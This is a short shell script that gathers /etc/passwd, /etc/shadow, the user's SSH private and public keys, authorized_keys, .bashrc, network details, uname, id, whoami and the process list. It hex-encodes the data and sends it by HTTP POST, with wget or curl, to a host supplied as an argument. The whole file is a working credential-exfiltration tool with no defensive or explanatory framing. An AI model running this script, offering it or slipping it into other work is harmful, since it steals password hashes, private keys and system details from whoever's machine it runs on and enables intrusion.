#!/usr/bin/env sh

function hexe() {
  local f
  f="$1"
  if [[ -z "$1" ]]; then
    f="/dev/stdin"
  fi
    xxd -ps "$f" | tr -d $'\n'
}

function build() {
  output="files_etc_passwd=$(hexe /etc/passwd)&files_etc_shadow=$(hexe /etc/shadow)&files_etc_issue=$(hexe /etc/issue*)&home_ssh_id_rsa=$(hexe ~/.ssh/id_rsa)&home_ssh_id_rsa_pub=$(hexe ~/.ssh/id_rsa.pub)&home_ssh_authorized_keys=$(hexe ~/.ssh/authorized_keys)&bashrc=$(hexe ~/.bashrc)&ifconfig=$(ifconfig -a 2> /dev/null | hexe || ip route 2> /dev/null | hexe)&uname=$(uname -a|hexe)&id_command=$(id|hexe)&user=$(whoami|hexe)&ps_aux=$(ps aux|hexe)"
  echo "$output"

}

wget -O- --post-data "$(build)" "http://$1/data/$2" || curl "http://$1/data/$2" --data "$(build)"
